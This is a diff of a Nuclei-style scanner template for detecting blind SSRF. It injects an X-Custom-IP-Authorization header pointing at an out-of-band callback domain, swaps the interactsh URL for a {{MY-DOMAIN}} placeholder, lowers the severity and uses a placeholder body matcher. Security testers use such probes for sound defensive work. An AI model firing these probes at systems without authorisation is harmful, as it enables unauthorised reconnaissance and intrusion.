@@ -2,15 +2,15 @@ id: 0x084
 
 info:
   name: Blind SSRF
-  author: reewardius
-  severity: high
+  author: 0xAwali
+  severity: info
 
-http:
+requests:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        X-Custom-IP-Authorization: {{Host}}.{{Port}}.BSSRF-084.{{interactsh-url}}/.{{Hostname}}
+        X-Custom-IP-Authorization: {{Host}}.{{Port}}.BSSRF-084.{{MY-DOMAIN}}/.{{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
         Accept-Encoding: gzip, deflate
@@ -18,8 +18,6 @@ http:
 
     matchers:
       - type: word
-        part: interactsh_protocol
+        part: body
         words:
-          - "dns"
-          - "http"
-        condition: or
+          - "Your Match"
